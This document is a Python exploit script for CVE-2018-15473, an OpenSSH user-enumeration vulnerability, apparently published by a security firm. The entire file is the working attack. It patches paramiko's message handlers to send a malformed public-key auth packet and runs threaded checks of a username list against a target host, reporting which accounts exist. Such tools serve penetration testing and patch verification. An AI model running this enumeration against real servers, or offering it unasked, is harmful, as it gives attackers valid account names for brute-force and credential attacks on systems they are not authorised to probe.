#!/usr/bin/env python3
# CVE-2018-15473 SSH User Enumeration by Leap Security (@LeapSecurity) https://leapsecurity.io
# Credits: Matthew Daley, Justin Gardner, Lee David Painter

import argparse, paramiko, socket, sys, os, multiprocessing, time
from pwn import log

TIMEOUT = 3

class InvalidUsername(Exception):
    pass


def add_boolean(*args, **kwargs):
    """Malicious function to malform packet"""
    pass

# function that'll be overwritten to malform the packet
old_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[
        paramiko.common.MSG_SERVICE_ACCEPT]

def service_accept(*args, **kwargs):
    """Malicious function to overwrite MSG_SERVICE_ACCEPT handler"""
    paramiko.message.Message.add_boolean = add_boolean
    return old_service_accept(*args, **kwargs)

def invalid_username(*args, **kwargs):
    """Callback when username invalid"""
    raise InvalidUsername()

# assign functions to respective handlers
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = service_accept
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = invalid_username

def check_user(username):
    """Perform authentication with malicious packet and username"""
    sock = socket.socket()
    sock.connect((args.target, args.port))
    transport = paramiko.transport.Transport(sock)

    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        log.warning('Failed to negotiate SSH transport')
        sys.exit(2)

    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
    except InvalidUsername:
        log.failure("{} is an invalid username".format(username))
        sys.exit(3)
    except paramiko.ssh_exception.AuthenticationException:
        log.success("{} is a valid username".format(username))


parser = argparse.ArgumentParser(description='SSH User Enumeration by Leap Security (@LeapSecurity)')
parser.add_argument('target', help="IP address of the target system")
parser.add_argument('-p', '--port', default=22, help="Set port of SSH service")
parser.add_argument('userlist', help="Username to check for validity.", type=argparse.FileType('r'))
parser.add_argument('--threads', type=int, default=5,
                    help="The number of threads to be used")


if __name__ == '__main__':
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()
    usernames = list(map(str.strip, args.userlist))
    threads = min(len(usernames),args.threads)
    pool = multiprocessing.Pool(threads)
    # run the checks
    results = [pool.apply_async(check_user, args=(user ,)) for user in usernames]
    time.sleep(TIMEOUT)
    pool.terminate()

